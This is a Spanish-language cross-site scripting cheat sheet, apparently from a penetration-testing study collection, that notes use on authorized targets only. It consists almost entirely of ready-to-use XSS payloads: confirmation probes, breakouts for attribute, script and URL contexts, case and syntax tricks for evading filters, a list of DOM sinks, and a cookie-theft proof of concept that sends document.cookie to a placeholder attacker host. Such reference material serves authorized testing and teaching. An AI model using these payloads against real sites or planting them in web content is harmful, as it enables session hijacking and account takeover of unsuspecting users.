# Cheatsheet · XSS

Explicación en `../../01-web/xss/xss.md`. **Solo sobre objetivos autorizados.**

## Prueba / confirmación

```html
<script>alert(document.domain)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

## Por contexto

```html
<!-- Atributo: cerrar comilla y añadir handler -->
" autofocus onfocus=alert(1) x="
' onmouseover='alert(1)
<!-- Dentro de <script> (string JS) -->
';alert(1);//
</script><script>alert(1)</script>
<!-- href / URL -->
javascript:alert(1)
```

## Evasión de filtros

```html
<sCrIpT>alert(1)</sCrIpT>
<img src=x oNerror=alert`1`>
<svg/onload=alert(1)>
<a href="jaVaScRipT:alert(1)">x</a>
<!-- sin paréntesis --> <svg onload=alert`1`>
```

## DOM XSS (sinks a vigilar)

```
innerHTML, outerHTML, document.write, eval, setTimeout, location, srcdoc
```

## PoC de impacto (robo de cookie)

```html
<script>new Image().src='http://TU-IP/c?'+document.cookie</script>
```

## Notas

- Identifica el contexto antes de elegir payload.
- Si hay CSP, revísala: puede bloquear inline; busca bypass o reporta la mitigación.
